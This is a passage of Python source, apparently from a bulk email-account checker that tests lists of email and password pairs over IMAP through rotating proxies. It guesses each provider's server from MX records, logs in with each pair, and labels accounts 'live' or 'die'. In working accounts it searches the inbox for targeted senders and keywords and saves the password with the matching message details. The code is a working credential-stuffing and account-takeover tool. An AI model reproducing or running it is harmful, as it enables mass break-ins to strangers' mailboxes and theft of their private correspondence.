                    ctx.minimum_version = _ssl.TLSVersion.SSLv3 if hasattr(_ssl.TLSVersion, "SSLv3") else _ssl.TLSVersion.TLSv1
                    sock = ctx.wrap_socket(sock, server_hostname=server)
                    ok, _banner = ImapChecker._recv_imap_banner(sock, timeout=timeout)
                else:
                    ok, _banner = ImapChecker._recv_imap_banner(sock, timeout=timeout)
                try:
                    sock.close()
                except Exception:
                    pass
                return ok, is_ssl
        except Exception:
            return False, None

    def _try_imap_variants(self, domain, email_address, password, proxy=None):
        if self.is_stopped:
            return None, False
        from imap_config import _get_parent_domain

        # MX-based detection PERTAMA — cepat (1 DNS query) vs prefix
        # attempt (4 connect x 3s timeout = 12s untuk domain unreg).
        # Kalau MX match provider known, langsung pakai IMAP provider.
        has_mx = False
        mx_str = ''
        # MX cache key: pakai parent domain. test0.hostinger.com -> hostinger.com
        # Semua subdomain dari domain yang sama share 1 MX lookup.
        from imap_config import _get_parent_domain
        _mx_key = _get_parent_domain(domain) or domain
        cached = None
        with self._mx_cache_lock:
            cached = self._mx_cache.get(_mx_key)
        if cached is not None:
            has_mx, mx_str = cached
        else:
            try:
                import dns.resolver
                if self.is_stopped:
                    return None, False
                mx_answers = dns.resolver.resolve(domain, 'MX', lifetime=3)
                has_mx = True
                mx_str = ' '.join(str(r.exchange).lower().rstrip('.') for r in mx_answers)
            except Exception:
                has_mx = False
                mx_str = ''
            # Cache hasil (positif maupun negatif)
            with self._mx_cache_lock:
                self._mx_cache[_mx_key] = (has_mx, mx_str)

        if has_mx:
            mx_imap_map = {
                # Hostinger (MX: *.hostinger.com)
                'hostinger.com': 'imap.hostinger.com',
                'hostinger.in': 'imap.hostinger.in',
                'hostinger.co': 'imap.hostinger.com',
                'hostinger.es': 'imap.hostinger.es',
                'hostinger.fr': 'imap.hostinger.fr',
                'hostinger.com.ar': 'imap.hostinger.com',
                'hostinger.com.br': 'imap.hostinger.com',
                'hostinger.co.id': 'imap.hostinger.com',
                'hostinger.mx': 'imap.hostinger.mx',
                # OVH / Scaleway (MX: *.ovh.net, *.online.net)
                'ovh.net': 'ssl0.ovh.net',
                'online.net': 'imap.online.net',
                # One.com (MX: *.one.com)
                'one.com': 'imap.one.com',
                # Register.it (MX: mail.register.it)
                'register.it': 'imap.register.it',
                # IONOS (MX: *.ionos.co.uk)
                'ionos.co.uk': 'imap.ionos.co.uk',
                'ionos.de': 'imap.ionos.de',
                'ionos.com': 'imap.ionos.com',
                # Gandi (MX: mail.gandi.net)
                'gandi.net': 'mail.gandi.net',
                # Securence (MX: *.securence.com)
                'securence.com': 'imap.securence.com',
                # Integrity (MX: mx.integrity.hu)
                'integrity.hu': 'mail.integrity.hu',
                # Nominalia (MX: mail.nominalia.com)
                'nominalia.com': 'mail.nominalia.com',
                # Yandex (MX: mx.yandex.net)
                'yandex.net': 'imap.yandex.com',
                # Alibaba (MX: *.mxhichina.com)
                'mxhichina.com': 'imap.mxhichina.com',
                # Mclink (MX: *.mclink.it)
                'mclink.it': 'imap.mclink.it',
                # Domeneshop (MX: mx.domeneshop.no)
                'domeneshop.no': 'mail.domeneshop.no',
                # Saunalahti (MX: mail.saunalahti.fi)
                'saunalahti.fi': 'mail.saunalahti.fi',
                # Vadesecure (MX: *.vadesecure.com)
                'vadesecure.com': 'imap.vadesecure.com',
                # 100ws.com (MX: mbox.100ws.com)
                '100ws.com': 'mail.100ws.com',
                # Cloudflare email routing — NO IMAP, skip
                # b5z.net — NO IMAP direct, skip
                # Locaweb — NO IMAP direct, skip
            }

            for mx_pattern, imap_server in mx_imap_map.items():
                if self.is_stopped:
                    return None, has_mx
                if mx_pattern in mx_str:
                    ok, ssl_flag = self._imap_banner_ok(imap_server, 993, proxy=proxy)
                    if self.is_stopped:
                        return None, has_mx
                    if ok:
                        return {"server": imap_server, "port": 993}, has_mx
                    break  # match tapi banner gagal → lanjut prefix

        # Prefix attempt (fallback kalau MX tidak match atau tidak ada MX)
        prefixes = ["imap", "mail", "imaps", ""]
        ports = [(993, True), (143, False)]  # 993 SSL dulu, lalu 143 plain

        def _try_host(host):
            for port, use_ssl in ports:
                if self.is_stopped:
                    return None
                ok, ssl_flag = self._imap_banner_ok(host, port, proxy=proxy)
                if self.is_stopped:
                    return None
                if not ok:
                    continue
                # Server ada. Kembalikan config — login di worker pakai
                # kredensial akun itu sendiri. Kalau login nanti gagal, itu
                # masuk kategori die/skip, BUKAN unreg (server valid).
                result = {"server": host, "port": port}
                if not use_ssl:
                    result["ssl"] = False
                return result
            return None

        def _attempt_all():
            for prefix in prefixes:
                if self.is_stopped:
                    return None
                server = f"{prefix}.{domain}" if prefix else domain
                res = _try_host(server)
                if self.is_stopped:
                    return None
                if res:
                    return res

            parent = _get_parent_domain(domain)
            if parent and parent != domain:
                for prefix in prefixes:
                    if self.is_stopped:
                        return None
                    server = f"{prefix}.{parent}" if prefix else parent
                    res = _try_host(server)
                    if self.is_stopped:
                        return None
                    if res:
                        return res
            return None

        result = _attempt_all()
        if result:
            return result, has_mx
        return None, has_mx

    def _worker(self, queue):
        configs = DEFAULT_IMAP_CONFIG.copy()
        with self.imap_config_lock:
            configs.update(self.imap_success_config)

        while not queue.empty() and not self.is_stopped:
            account = queue.get()
            email_addr = account["email"]
            password = account["password"]
            domain = email_addr.split("@")[-1].lower()

            # Check stop flag
            if self.is_stopped:
                queue.task_done()
                break

            # Get proxy for this account (round-robin rotation)
            proxy = self._get_proxy()

            # Skip domain
            if any(kw in domain for kw in self.skip_domain_keywords):
                self._write_domain_skip(email_addr, password)
                self._update_progress("skipped")
                queue.task_done()
                continue

            # Get IMAP config (with parent domain fallback)
            with self.imap_config_lock:
                extra = self.imap_success_config
            imap_cfg = lookup_imap_config(domain, extra_configs=extra)

            # Wildcard *.rr.com
            if not imap_cfg and domain.endswith(".rr.com"):
                imap_cfg = {"server": "mail.twc.com", "port": 143, "ssl": False}

            if not imap_cfg and domain not in self.unreg_domains:
                result, has_mx = self._try_imap_variants(domain, email_addr, password, proxy=proxy)
                if self.is_stopped:
                    queue.task_done()
                    continue
                if result:
                    # Save di root domain, bukan subdomain. Kalau server
                    # hostname mengandung parent/grandparent, artinya IMAP-nya
                    # ada di root — save di root supaya subdomain lain
                    # auto-lookup via parent fallback (tidak bikin entry
                    # redundant per-subdomain).
                    from imap_config import _get_parent_domain
                    save_domain = domain
                    server_lower = result["server"].lower()
                    # Cek parent
                    parent = _get_parent_domain(domain)
                    if parent and parent in server_lower:
                        save_domain = parent
                        # Cek grandparent juga
                        grandparent = _get_parent_domain(parent)
                        if grandparent and grandparent in server_lower:
                            save_domain = grandparent
                    self._update_imap_config(save_domain, result)
                    imap_cfg = result
                    configs[domain] = result
                    configs[save_domain] = result
                else:
                    # has_mx True = domain punya MX tapi IMAP tidak ditemukan
                    # has_mx False = domain tidak punya MX (true unreg)
                    if has_mx:
                        self._write_noimap(domain)
                        self._update_progress("noimap")
                    else:
                        self._write_unreg(domain)
                        self._update_progress("unreg")
                    queue.task_done()
                    continue
            elif not imap_cfg:
                self._update_progress("unreg")
                queue.task_done()
                continue

            def try_connect(cfg, px=proxy):
                use_ssl = cfg.get('ssl', True)
                m = imap_via_proxy(px, cfg['server'], cfg['port'], use_ssl=use_ssl)
                m.login(email_addr, password)
                return m

            if self.is_stopped:
                queue.task_done()
                continue

            mail_conn = None
            try:
                try:
                    mail_conn = try_connect(imap_cfg)
                    self._update_imap_config(domain, imap_cfg)
                except Exception:
                    if self.is_stopped:
                        queue.task_done()
                        break
                    fallback = self._try_imap_variants(domain, email_addr, password, proxy=proxy)
                    if not fallback:
                        raise
                    self._update_imap_config(domain, fallback)
                    configs[domain] = fallback
                    mail_conn = try_connect(fallback)

                if self.is_stopped:
                    try: mail_conn.logout()
                    except: pass
                    queue.task_done()
                    continue

                mail_conn.select("INBOX")
                if self.is_stopped:
                    try: mail_conn.logout()
                    except: pass
                    queue.task_done()
                    continue
                email_ids = set()
                subject_matched_ids = set()  # bytes UIDs from SUBJECT branch — consumed by post-fetch gate
                # Search by sender
                for sender in self.target_senders:
                    criteria = f'(SINCE "{self.search_since_date}" FROM "{_escape_imap_string(sender)}")'
                    status, msgs = mail_conn.search(None, criteria)
                    if status == "OK" and msgs and msgs[0]:
                        email_ids.update(msgs[0].split())
                # Search by keyword (SUBJECT)
                for kw in self.keywords:
                    criteria = f'(SINCE "{self.search_since_date}" SUBJECT "{_escape_imap_string(kw)}")'
                    status, msgs = mail_conn.search(None, criteria)
                    if status == "OK" and msgs and msgs[0]:
                        ids = msgs[0].split()
                        email_ids.update(ids)
                        subject_matched_ids.update(ids)

                sorted_ids = sorted(list(email_ids), key=lambda x: int(x))[-20:]
                sorted_ids.reverse()  # Newest first
                emails_data = []

                if sorted_ids:
                    for eid_bytes in sorted_ids:
                        if self.is_stopped:
                            break
                        eid = eid_bytes.decode()
                        _, msg_data = mail_conn.fetch(eid, "(RFC822)")
                        for part in msg_data:
                            if isinstance(part, tuple):
                                msg = email.message_from_bytes(part[1])
                                subject = decode_mime_words(msg.get("Subject", ""))
                                if not _subject_excluded(subject, self.subject_exclusion_patterns):
                                    from_ = decode_mime_words(msg.get("From", ""))
                                    _name, from_addr = email.utils.parseaddr(from_)
                                    if (
                                        (not self.target_senders)
                                        or sender_matches(from_addr, self.target_senders)
                                        or eid_bytes in subject_matched_ids
                                    ):
                                        date_str = decode_mime_words(msg.get("Date", ""))
                                        emails_data.append({
                                            "subject": subject,
                                            "from": from_,
                                            "date": date_str
                                        })

                if self.is_stopped:
                    try: mail_conn.logout()
                    except: pass
                    queue.task_done()
                    continue

                if emails_data:
                    self._write_live(email_addr, password, emails_data)
                    self._update_progress("live")
                else:
                    self._write_noemail(email_addr, password)
                    self._update_progress("noemail")

                try: mail_conn.logout()
                except: pass
            except Exception:
                self._write_die(email_addr, password)
                self._update_progress("die")
                try:
                    if mail_conn:
                        mail_conn.logout()
                except Exception:
                    pass
            queue.task_done()

    def run(self):
        """Start checking in background threads."""
        self.status = "running"

        self._queue = Queue()
        for acc in self.accounts:
            self._queue.put(acc)

        num_threads = min(self.max_threads, len(self.accounts))
        threads = []
        for _ in range(num_threads):
            t = threading.Thread(target=self._worker, args=(self._queue,))
            t.daemon = True
            t.start()
            threads.append(t)

        # Wait for completion in a separate thread so run() returns immediately
        def wait_completion():
            self._queue.join()
            for t in threads:
                t.join(timeout=2)
            if not self.is_stopped:
                self.status = "done"

        watcher = threading.Thread(target=wait_completion)
        watcher.daemon = True
        watcher.start()
